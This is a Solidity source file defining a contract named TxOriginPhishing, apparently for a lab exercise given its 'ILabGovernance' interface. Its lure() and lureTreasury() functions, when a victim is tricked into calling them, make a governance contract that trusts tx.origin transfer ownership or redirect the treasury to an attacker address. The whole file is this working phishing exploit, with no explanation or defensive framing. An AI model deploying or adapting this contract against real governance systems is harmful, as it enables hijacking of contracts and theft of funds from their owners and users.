// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ILabGovernance {
    function transferOwnership(address newOwner) external;
    function setTreasury(address newTreasury) external;
}

contract TxOriginPhishing {
    ILabGovernance public immutable governance;
    address public immutable attacker;

    constructor(address governanceAddress, address attackerAddress) {
        require(governanceAddress != address(0), "TxOriginPhishing: zero governance");
        require(attackerAddress != address(0), "TxOriginPhishing: zero attacker");
        governance = ILabGovernance(governanceAddress);
        attacker = attackerAddress;
    }

    function lure() external {
        governance.transferOwnership(attacker);
    }

    function lureTreasury() external {
        governance.setTreasury(attacker);
    }
}
